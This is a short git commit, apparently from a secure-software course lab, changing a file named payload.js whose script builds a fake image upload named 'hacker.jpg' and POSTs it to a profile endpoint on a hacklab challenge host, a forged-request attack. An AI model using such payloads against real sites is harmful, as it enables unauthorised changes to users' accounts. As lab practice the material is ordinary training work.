3f84663b3e12ab471958004d3f71cf25bbbdf6df
Matias Lima <matiaselima@hotmail.com>
2026-09-24 05:11:25 -0300

    probando 2

--- payload.js
+++ payload.js
@@ -4,7 +4,7 @@ var fakeImage = new Blob(["imagen_modificada"], { type: "image/jpeg" });
 formData.append("profile_pic", fakeImage, "hacker.jpg");
 
 // Recuerda poner la ruta correcta de la petición original aquí
-fetch('/ruta_del_perfil', {
+fetch('https://chl-4678a9a0-9134-4d4a-9ff5-023cd20a4d1c-blog-hacklab.softwareseguro.com.ar/profile', {
   method: 'POST',
   body: formData
 });
